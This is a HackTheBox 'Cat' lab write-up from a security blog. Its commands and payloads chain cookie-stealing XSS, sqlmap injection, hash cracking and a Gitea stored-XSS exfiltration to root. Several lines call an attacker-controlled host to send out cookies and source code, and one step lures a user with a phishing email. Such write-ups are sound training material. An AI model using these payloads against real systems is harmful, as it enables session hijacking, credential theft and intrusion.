root@localhost:~# ls git-dump/ accept_cat.php admin.php config.php contest.php css delete_cat.php img img_winners index.php join.php logout.php view_cat.php vote.php winners winners.php copy Analyzing the source code, we find a potential XSS vulnerability in contest.php where the owner_username from the session is inserted into the database without proper sanitization. This username is then displayed in view_cat.php.\n// contest.php // Check if $uploadOk is set to 0 by an error if ($uploadOk == 0) { } else { if (move_uploaded_file($_FILES[\u0026#34;cat_photo\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { // Prepare SQL query to insert cat data $stmt = $pdo-\u0026gt;prepare(\u0026#34;INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)\u0026#34;); // Bind parameters $stmt-\u0026gt;bindParam(\u0026#39;:cat_name\u0026#39;, $cat_name, PDO::PARAM_STR); $stmt-\u0026gt;bindParam(\u0026#39;:age\u0026#39;, $age, PDO::PARAM_INT); $stmt-\u0026gt;bindParam(\u0026#39;:birthdate\u0026#39;, $birthdate, PDO::PARAM_STR); $stmt-\u0026gt;bindParam(\u0026#39;:weight\u0026#39;, $weight, PDO::PARAM_STR); $stmt-\u0026gt;bindParam(\u0026#39;:photo_path\u0026#39;, $target_file, PDO::PARAM_STR); $stmt-\u0026gt;bindParam(\u0026#39;:owner_username\u0026#39;, $_SESSION[\u0026#39;username\u0026#39;], PDO::PARAM_STR); // Execute query if ($stmt-\u0026gt;execute()) { $success_message = \u0026#34;Cat has been successfully sent for inspection.\u0026#34;; } else { $error_message = \u0026#34;Error: There was a problem registering the cat.\u0026#34;; } } else { $error_message = \u0026#34;Error: There was a problem uploading the file.\u0026#34;; } } } And then in the view_cat.php file, this parameter is retrieved and displayed:\n// Get the cat_id from the URL $cat_id = isset($_GET[\u0026#39;cat_id\u0026#39;]) ? $_GET[\u0026#39;cat_id\u0026#39;] : null; if ($cat_id) { // Prepare and execute the query $query = \u0026#34;SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id\u0026#34;; $statement = $pdo-\u0026gt;prepare($query); $statement-\u0026gt;bindParam(\u0026#39;:cat_id\u0026#39;, $cat_id, PDO::PARAM_INT); $statement-\u0026gt;execute(); // Fetch cat data from the database $cat = $statement-\u0026gt;fetch(PDO::FETCH_ASSOC); if (!$cat) { die(\u0026#34;Cat not found.\u0026#34;); } } else { die(\u0026#34;Invalid cat ID.\u0026#34;); } Exploiting XSS to get Admin Session We\u0026rsquo;ll register a new user with an XSS payload in the username, designed to exfiltrate the PHPSESSID cookie.\n\u0026lt;img src=x onerror=this.src=\u0026#34;http://\u0026lt;YOUR IP\u0026gt;:\u0026lt;PORT\u0026gt;/\u0026#34;+btoa(document.cookie)\u0026gt; First, we set up a simple Python web server to capture the exfiltrated cookie.\n0xblivion@cat: ~ root@localhost:~# php -S 0.0.0.0:80 [Thu Jul 3 23:40:54 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started copy We register a new account on http://cat.htb/join.php using the XSS payload as the username and any valid email/password.\nThen, we log in with the newly registered XSS user and navigate to contest.php to register a cat. This action triggers the XSS, as the owner_username (containing our payload) is processed.\nOn our PHP web server, we capture the base64 encoded cookie:\n0xblivion@cat: ~ root@localhost:~# php -S 0.0.0.0:80 [Thu Jul 3 23:40:54 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started [Fri Jul 4 00:02:23 2025] 10.10.11.53:36812 [200]: GET /UEhQU0VTU0lEPXM0YWcyaWpkMDA0cWg2YTJwbzMxZm1jNThj [Fri Jul 4 00:02:23 2025] 10.10.11.53:36812 Closing [Fri Jul 4 00:02:23 2025] 10.10.11.53:36818 Accepted [Fri Jul 4 00:02:23 2025] 10.10.11.53:36818 [200]: GET /UEhQU0VTU0lEPXM0YWcyaWpkMDA0cWg2YTJwbzMxZm1jNThj copy We decode the captured cookie:\n0xblivion@cat: ~ root@localhost:~# echo \"UEhQU0VTU0lEPTduOTFkcmVnanFqZ2lhdWIzdG9ocGhhcGMy\" | base64 -d PHPSESSID=7n91dregjqjgiaub3tohphapc2 copy We then use the browser\u0026rsquo;s developer console to change our PHPSESSID cookie to the captured value:\nAfter refreshing the site, we gain access to the admin panel:\nSQL Injection From the dumped source code, config.php reveals that the application uses SQLite:\nFurther analysis of accept_cat.php shows a SQL Injection vulnerability in the catName parameter.\nWe intercept a request to accept_cat.php using Burp Suite and save it to a file named accepet_cat.req:\n0xblivion@cat: ~ root@localhost:~# cat accepet_cat.req POST /accept_cat.php HTTP/1.1 Host: cat.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 21 Origin: http://cat.htb Connection: keep-alive Referer: http://cat.htb/admin.php Cookie: PHPSESSID=dfvc101c10h4bv5nihmdnkp300 Priority: u=0 catName=awdaw\u0026catId=1 copy We use sqlmap to exploit the SQL Injection vulnerability in the catName parameter:\n0xblivion@cat: ~ root@localhost:~# sqlmap -r accepet_cat.req --batch -p catName --level 5 --risk 3 ___ __H__ ___ ___[.]_____ ___ ___ {1.9.4#stable} |_ -| . [.] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 11:07:26 /2025-07-05/ [11:07:26] [INFO] parsing HTTP request from 'accepet_cat.req' [11:07:26] [INFO] resuming back-end DBMS 'sqlite' [11:07:26] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: catName (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'\u0026catId=1 --- [11:07:27] [INFO] the back-end DBMS is SQLite web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan) web application technology: Apache 2.4.41 back-end DBMS: SQLite [11:07:27] [INFO] fetched data logged to text files under '/home/gen/.local/share/sqlmap/output/cat.htb' [*] ending @ 11:07:27 /2025-07-05/ copy Confirming the SQL Injection, we proceed to dump the database tables:\n0xblivion@cat: ~ root@localhost:~# sqlmap -r accepet_cat.req --batch -p catName --level 5 --risk 3 --tables ___ __H__ ___ ___[)]_____ ___ ___ {1.9.4#stable} |_ -| . [)] | .'| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 11:09:16 /2025-07-05/ [11:09:16] [INFO] parsing HTTP request from 'accepet_cat.req' [11:09:16] [INFO] resuming back-end DBMS 'sqlite' [11:09:16] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: catName (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'\u0026catId=1 --- [11:09:16] [INFO] the back-end DBMS is SQLite web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal) web application technology: Apache 2.4.41 back-end DBMS: SQLite [11:09:16] [INFO] fetching tables for database: 'SQLite_masterdb' [11:09:16] [INFO] fetching number of tables for database 'SQLite_masterdb' [11:09:16] [INFO] resumed: 4 [11:09:16] [INFO] resumed: accepted_cats [11:09:16] [INFO] resumed: sqlite_sequence [11:09:16] [INFO] resumed: cats [11:09:16] [INFO] resumed: users [4 tables] +-----------------+ | accepted_cats | | cats | | sqlite_sequence | | users | +-----------------+ [11:09:16] [INFO] fetched data logged to text files under '/home/gen/.local/share/sqlmap/output/cat.htb' [*] ending @ 11:09:16 /2025-07-05/ copy The users table is of particular interest. We dump its contents:\n0xblivion@cat: ~ root@localhost:~# sqlmap -r accepet_cat.req --batch -p catName --level 5 --risk 3 -T users --dump __ __H__ ___ ___[\"]_____ ___ ___ {1.9.4#stable} |_ -| . [)] | .'| . | |___|_ [']_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 11:10:58 /2025-07-05/ [11:10:58] [INFO] parsing HTTP request from 'accepet_cat.req' [11:10:58] [INFO] resuming back-end DBMS 'sqlite' [11:10:58] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: catName (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'\u0026catId=1 --- [11:10:58] [INFO] the back-end DBMS is SQLite web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal) web application technology: Apache 2.4.41 back-end DBMS: SQLite ...SNIP... Database: Table: users [10 entries] ...SNIP... copy The dump reveals 10 user entries. We extract the usernames and hashes into a username:password format:\nuser_id email password username 1 axel2017@gmail.com d1bbba3670feb9435c9841e46e60ee2f axel 2 rosamendoza485@gmail.com ac369922d560f17d6eeb8b2c7dec498c rosa 3 robertcervantes2000@gmail.com 42846631708f69c00ec0c0a8aa4a92ad robert 4 fabiancarachure2323@gmail.com 39e153e825c4a3d314a0dc7f7475ddbe fabian 5 jerrysonC343@gmail.com 781593e060f8d065cd7281c5ec5b4b86 jerryson 6 larryP5656@gmail.com 1b6dce240bbfbc0905a664ad199e18f8 larry 7 royer.royer2323@gmail.com c598f6b844a36fa7836fba0835f1f6 royer 8 peterCC456@gmail.com e41ccefa439fc454f7eadbf1f139ed8a peter 9 angel234g@gmail.com 24a8ec003ac2e1b3c5953a6f95f8f565 angel 10 jobert2020@gmail.com 88e4dceccd48820cf77b5cf6c08698ad jobert 0xblivion@cat: ~ root@localhost:~# grep -E '\\|[[:space:]]*[0-9]+[[:space:]]*\\|' dump.txt | awk -F '|' '{for(i=1;i\u003c=NF;i++)gsub(/^[ \\t]+|[ \\t]+$/, \"\", $i); if(NF\u003e=5 \u0026\u0026 $5!=\"\") print $5 \":\" $4}' | tee hashes.txt axel:d1bbba3670feb9435c9841e46e60ee2f rosa:ac369922d560f17d6eeb8b2c7dec498c robert:42846631708f69c00ec0c0a8aa4a92ad fabian:39e153e825c4a3d314a0dc7f7475ddbe jerryson:781593e060f8d065cd7281c5ec5b4b86 larry:1b6dce240bbfbc0905a664ad199e18f8 royer:c598f6b844a36fa7836fba0835f1f6 peter:e41ccefa439fc454f7eadbf1f139ed8a angel:24a8ec003ac2e1b3c5953a6f95f8f565 copy We extract only the hashes to use with an online cracker like CrackStation.\n0xblivion@cat: ~ root@localhost:~# cat hashes.txt | awk -F: '{print $2}' d1bbba3670feb9435c9841e46e60ee2f ac369922d560f17d6eeb8b2c7dec498c 42846631708f69c00ec0c0a8aa4a92ad 39e153e825c4a3d314a0dc7f7475ddbe 781593e060f8d065cd7281c5ec5b4b86 1b6dce240bbfbc0905a664ad199e18f8 c598f6b844a36fa7836fba0835f1f6 e41ccefa439fc454f7eadbf1f139ed8a 24a8ec003ac2e1b3c5953a6f95f8f565 copy Submitting these hashes to CrackStation, we find one cracked password:\nWe identify the user associated with the cracked hash:\n0xblivion@cat: ~ root@localhost:~# cat hashes.txt| grep ac369922d560f17d6eeb8b2c7dec498c rosa:ac369922d560f17d6eeb8b2c7dec498c copy The cracked password belongs to rosa. We attempt to SSH into the box as rosa:\n0xblivion@cat: ~ root@localhost:~# ssh rosa@cat.htb The authenticity of host 'cat.htb (10.10.11.53)' can't be established. ED25519 key fingerprint is SHA256:tsmOV3JuQkCv6HNUqg9YQ+DJznLS2nYKJl4zIwKtbE4. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:22: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'cat.htb' (ED25519) to the list of known hosts. rosa@cat.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Sat 05 Jul 2025 03:31:27 PM UTC System load: 0.01 Usage of /: 51.9% of 6.06GB Memory usage: 16% Swap usage: 0% Processes: 236 Users logged in: 0 IPv4 address for eth0: 10.10.11.53 IPv6 address for eth0: dead:beef::250:56ff:feb0:bb1a * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edge Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64 rosa@cat:~$ copy We have successfully gained SSH access as rosa.\nUser Flag Upon logging in as rosa, we check the user\u0026rsquo;s group memberships using the id command:\n0xblivion@cat: ~ rosa@cat:~$ id uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm) copy The rosa user is part of the adm group. This group typically has permissions to read system log files and other administrative files. Since Apache is running on the server, we check its access logs for interesting information:\n0xblivion@cat: ~ rosa@cat:~$ head -5 /var/log/apache2/access.log 127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] \"GET /join.php HTTP/1.1\" 200 1683 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] \"GET /css/styles.css HTTP/1.1\" 200 1155 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] \"GET /favicon.ico HTTP/1.1\" 404 485 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:50 +0000] \"GET /join.php?loginUsername=axel\u0026loginPassword=aNdZwgC4tI9gnVXv_e3Q\u0026loginForm=Login HTTP/1.1\" 302 329 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:50 +0000] \"GET / HTTP/1.1\" 200 1436 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" copy The logs show a login attempt by user axel with a password. We check if axel is a system user.\n0xblivion@cat: ~ rosa@cat:~$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash axel:x:1000:1000:axel:/home/axel:/bin/bash rosa:x:1001:1001:,,,:/home/rosa:/bin/bash git:x:114:119:Git Version Control,,,:/home/git:/bin/bash jobert:x:1002:1002:,,,:/home/jobert:/bin/bash copy User axel exists. We attempt to switch user to axel using the password found in the logs.\n0xblivion@cat: ~ rosa@cat:~$ su - axel Password: axel@cat:~$ cat user.txt fa36b2c0a19c890b16baae817657e4b8 copy User flag: fa36b2c0a19c890b16baae817657e4b8 Privilege Escalation to Root From the /etc/passwd file, we noticed a git user, which suggests a local Git hosting service. We check the listening ports on the server.\n0xblivion@cat: ~ axel@cat:~$ ss -lntp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 10 127.0.0.1:587 0.0.0.0:* LISTEN 0 37 127.0.0.1:55923 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 1 127.0.0.1:36727 0.0.0.0:* LISTEN 0 128 127.0.0.1:48983 0.0.0.0:* LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* LISTEN 0 10 127.0.0.1:25 0.0.0.0:* LISTEN 0 511 *:80 *:* LISTEN 0 128 [::]:22 [::]:* copy Port 3000 is listening locally, which is a common port for Gitea. Port 25 (SMTP) is also open. When we SSH as axel, we notice a mail notification.\n0xblivion@cat: ~ root@localhost:~# ssh axel@cat.htb axel@cat.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64) ...SNIP... You have mail. Last login: Fri Jan 31 11:31:57 2025 from 10.10.14.69 axel@cat:~$ copy Reading axel\u0026rsquo;s mail reveals details about an internal Gitea service running on localhost:3000.\n0xblivion@cat: ~ axel@cat:~$ cat /var/mail/axel From rosa@cat.htb Sat Sep 28 04:51:50 2024 Return-Path: Received: from cat.htb (localhost [127.0.0.1]) by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592 for ; Sat, 28 Sep 2024 04:51:50 GMT Received: (from rosa@localhost) by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591 for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT Date: Sat, 28 Sep 2024 04:51:49 GMT From: rosa@cat.htb Message-Id: \u003c202409280451.48S4pnlT001591@cat.htb\u003e Subject: New cat services Hi Axel, We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop. Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository. From rosa@cat.htb Sat Sep 28 05:05:28 2024 Return-Path: Received: from cat.htb (localhost [127.0.0.1]) by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268 for ; Sat, 28 Sep 2024 05:05:28 GMT Received: (from rosa@localhost) by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267 for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT Date: Sat, 28 Sep 2024 05:05:28 GMT From: rosa@cat.htb Message-Id: \u003c202409280505.48S55Sm0002267@cat.htb\u003e Subject: Employee management We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md. copy The mail indicates that jobert@localhost will review a Gitea repository, and provides a link to an \u0026ldquo;Employee management\u0026rdquo; repository: http://localhost:3000/administrator/Employee-management/.\nWe forward port 3000 from the target to our local machine via SSH.\n0xblivion@cat: ~ root@localhost:~# ssh -L 3000:127.0.0.1:3000 axel@cat.htb axel@cat.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64) ...SNIP... copy Now, we can access http://localhost:3000 in our browser. The Gitea instance shows three users when exploring.\nLogging in as axel with his password, we notice the Gitea version is 1.22.0 in the footer.\nSearching for exploits for Gitea 1.22.0, we find a Stored XSS vulnerability.\nThe XSS vulnerability can be exploited by injecting a payload into the repository description. We aim to extract the index.php file from the Employee-management repository, as the email suggested jobert would review the repository.\nWe craft an XSS payload to fetch the content of http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php and send it to our local web server.\n\u0026lt;a href=\u0026#34;javascript:fetch(\u0026#39;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php\u0026#39;).then(r=\u0026gt;r.text()).then(d=\u0026gt;fetch(\u0026#39;http://10.10.15.7:1234/?x=\u0026#39;+encodeURIComponent(d)))\u0026#34;\u0026gt;Click\u0026lt;/a\u0026gt; We create a new repository in Gitea (e.g., HALLO) and paste the XSS payload into the Description field, ensuring \u0026ldquo;Initialize this repository with a README.md\u0026rdquo; is checked.\nNext, we send an email to jobert@localhost with a link to our malicious repository, knowing that jobert will likely click it to review.\n0xblivion@cat: ~ axel@cat:~$ echo -e \"Subject: Hello, click here http://localhost:3000/axel/HALLO\" | sendmail jobert@localhost copy On our Python web server (listening on port 1234), we receive the exfiltrated index.php content.\n0xblivion@cat: ~ root@localhost:~# python3 -m http.server 1234 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ... 10.10.11.53 - - [05/Jul/2025 12:10:15] \"GET /?x=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A copy Decoding the URL-encoded content reveals the PHP source code for index.php:\n\u0026lt;?php $valid_username = \u0026#39;admin\u0026#39;; $valid_password = \u0026#39;IKw75eR0MR7CMIxhH0\u0026#39;; if (!isset($_SERVER[\u0026#39;PHP_AUTH_USER\u0026#39;]) || !isset($_SERVER[\u0026#39;PHP_AUTH_PW\u0026#39;]) || $_SERVER[\u0026#39;PHP_AUTH_USER\u0026#39;] != $valid_username || $_SERVER[\u0026#39;PHP_AUTH_PW\u0026#39;] != $valid_password) { header(\u0026#39;WWW-Authenticate: Basic realm=\u0026#34;Employee Management\u0026#34;\u0026#39;); header(\u0026#39;HTTP/1.0 401 Unauthorized\u0026#39;); exit; } header(\u0026#39;Location: dashboard.php\u0026#39;); exit; ?\u0026gt; The code reveals credentials for an \u0026ldquo;Employee Management\u0026rdquo; system: admin:IKw75eR0MR7CMIxhH0. We attempt to switch user to root using this password.\n0xblivion@cat: ~ axel@cat:~$ su - root Password: root@cat:~# cat root.txt 11fad706f903f0c73a5c66aa2dbd4d2c copy Root flag: 11fad706f903f0f73a5c66aa2dbd4d2c ","permalink":"https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/","summary":"\u003ch1 id=\"overview\"\u003eOverview\u003c/h1\u003e\n\u003cimg src=\"/img/cat/Cat.png\" alt=\"Cat\" class=\"img-responsive\" loading=\"lazy\" /\u003e\n\u003cp\u003eThis box focuses on web application vulnerabilities, specifically Cross-Site Scripting (\u003ccode\u003eXSS\u003c/code\u003e) and \u003ccode\u003eSQL Injection\u003c/code\u003e, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.\u003c/p\u003e","title":"HackTheBox - Cat Writeup"},{"content":"This site is a collection of writeups, notes, and research related to hacking, CTFs, and practical exploitation. Most content is technical and meant to be useful to others working in the same field.\nFocus Areas Network attacks Web application security Reverse engineering and binary exploitation Tool development and automation Tools and Stack Too many to list. Use what works, write what doesn\u0026rsquo;t. Intent I use this space to track my own progress, share useful techniques, and test ideas.\n\u0026ldquo;Read all books. All of them. Then read them again. Understand every detail. The nitty gritty. Then keep asking \u0026lsquo;why?\u0026rsquo; And \u0026lsquo;why not done differently?\u0026rsquo;\u0026rdquo;\n— Skyper, THC\n","permalink":"https://0xblivion.dev/about/","summary":"\u003cp\u003eThis site is a collection of writeups, notes, and research related to hacking, CTFs, and practical exploitation. Most content is technical and meant to be useful to others working in the same field.\u003c/p\u003e\n\u003ch2 id=\"focus-areas\"\u003eFocus Areas\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eNetwork attacks\u003c/li\u003e\n\u003cli\u003eWeb application security\u003c/li\u003e\n\u003cli\u003eReverse engineering and binary exploitation\u003c/li\u003e\n\u003cli\u003eTool development and automation\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"tools-and-stack\"\u003eTools and Stack\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eToo many to list. Use what works, write what doesn\u0026rsquo;t.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"intent\"\u003eIntent\u003c/h2\u003e\n\u003cp\u003eI use this space to track my own progress, share useful techniques, and test ideas.\u003c/p\u003e","title":"About This Site"}]